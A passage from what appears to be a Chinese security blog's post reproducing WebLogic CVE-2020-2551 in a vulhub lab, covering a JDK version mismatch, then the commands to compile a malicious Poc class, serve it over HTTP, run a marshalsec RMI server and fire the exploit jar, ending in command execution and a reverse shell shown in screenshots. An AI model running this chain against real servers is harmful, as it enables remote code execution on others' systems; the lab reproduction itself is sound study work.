src="https://i.loli.net/2020/08/22/PxagBIbLeO8G9k6.png"><br>是上面的配置jdk下面那个project language level选高了 ，改成8，再来一次build，哇 成功输出文件：<br><img src="https://i.loli.net/2020/08/22/iX89Nomy2hObsAf.png"><br>马上就要运行一下，没问题了：<br><img src="https://i.loli.net/2020/08/22/BbRS5vzxPM2E8Gn.png"></p><p><img src="https://i.loli.net/2020/08/22/4i25J7BTXm1aNUQ.png"></p><h4 id="3-进行复现"><a href="#3-进行复现" class="headerlink" title="3. 进行复现"></a>3. 进行复现</h4><p><i class="far fa-hand-point-right">首测失败</i><br>用<a href="https://github.com/vulhub/vulhub">vulhub</a>搭建了一个weblogic环境，恶意rmi使用<a href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md">JNDI-Injection-Exploit</a>。但是这个工具编译版本为jdk1.7+,漏洞环境是jdk1.6，所以没成功，从下面日志中可以看到漏洞触发成功访问了rmi服务，但是接着报错不支持version 52，说明执行代码的jdk版本低于编译的jdk版本。搜到jdk版本和stanford parser对应关系是J2SE 8 = 52,J2SE 7 = 51,J2SE 6.0 = 50,J2SE 5.0 = 49,JDK 1.4 = 48,JDK 1.3 = 47,JDK 1.2 = 46,JDK 1.1 = 45，所以后面用指定编译版本为1.6编译exp。</p><p><img src="https://i.loli.net/2020/08/22/LnJFTZjINAUGHcO.png"></p><p><img src="https://i.loli.net/2020/08/22/pCW3QS8huHdq74i.png"><br><i class="far fa-hand-point-right">这下该成功了吧</i><br>1、使用<code>javac Poc.java -source 1.6 -target 1.6</code> 指定ban’y来编译我们的Poc.java:<br><img src="https://i.loli.net/2020/08/22/v7rx1BlsGL63Hbq.png"><br>并且启动一个web服务来让恶意类可以被访问到<code>python3 -m http.server 80</code></p><p>2、恶意rmi服务<br><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.111.1/#Poc" 1099</code><br> <img src="https://i.loli.net/2020/08/22/tvqyw4ViMRDs6X2.png"><br> 3、用poc测试<code>java -jar CVE-2020-2551.jar 192.168.111.130 7001 rmi://192.168.111.1:1099/Poc</code><br> <img src="https://i.loli.net/2020/08/22/QWrdZmLjRFpC4k9.png"><br> 4、可以看到weblogic请求rmi后从web服务器里获取到了恶意类：<br><img src="https://i.loli.net/2020/08/22/3cKysEfCUx7w5uA.png"><br>5、此时上漏洞环境查看目录，命令执行成功：<br><img src="https://i.loli.net/2020/08/22/mOjkndpgSUhMAZX.png"><br>6、反弹shell：<br><img src="https://i.loli.net/2020/08/22/9te16OBNi8huVcP.png" alt="执行流程"></p><p><img src="https://i.loli.net/2020/08/22/k9sf8bBZaKXMTrI.png" alt="成功后的日志"></p><hr><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://blog.csdn.net/m0_37961948/article/details/78161828?utm_source=blogxgwz3">https://blog.csdn.net/m0_37961948/article/details/78161828?utm_source=blogxgwz3</a><br><a href="https://www.cnblogs.com/zhaoqingqing/p/11847791.html">https://www.cnblogs.com/zhaoqingqing/p/11847791.html</a><br><a href="https://blog.csdn.net/weixin_43149083/article/details/89639747">https://blog.csdn.net/weixin_43149083/article/details/89639747</a><br><a href="https://y4er.com/post/weblogic-cve-2020-2551/">https://y4er.com/post/weblogic-cve-2020-2551/</a><br><a href="https://xz.aliyun.com/t/7374#toc-13">https://xz.aliyun.com/t/7374#toc-13</a><br><a href="https://xz.aliyun.com/t/7498">https://xz.aliyun.com/t/7498</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> weblogic漏洞 </tag>
            
            <tag> IDEA编译 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
